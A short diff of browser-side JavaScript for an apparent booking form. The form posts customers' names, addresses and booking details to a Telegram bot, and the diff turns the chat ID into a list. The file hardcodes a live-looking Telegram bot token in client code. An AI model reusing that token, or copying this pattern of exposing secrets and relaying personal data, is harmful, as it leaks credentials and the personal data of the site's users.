@@ -1,6 +1,5 @@
 const TELEGRAM_TOKEN = '7562593192:AAHCAufAjNw6DjBfHSIVsj8gLfZk24BoXjk';
-const CHAT_ID = '6300694007';
-
+const CHAT_ID = ['6300694007'];
 
 let bookingAmount = null;
 
@@ -76,7 +75,7 @@ function validateFormAndSend() {
     First Name: ${firstName}
     Last Name: ${lastName}
     Address: ${address}
-    Session Amount: $${bookingAmount}
+    Session Amount: $${bookingAmount || 'Not specified'}
     Reason: ${reason}
   `;
 
@@ -87,6 +86,7 @@ function validateFormAndSend() {
 function sendToTelegram(message) {
   const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
 
+  // Loop through each CHAT_ID
   CHAT_ID.forEach((id) => {
     const data = {
       chat_id: id,
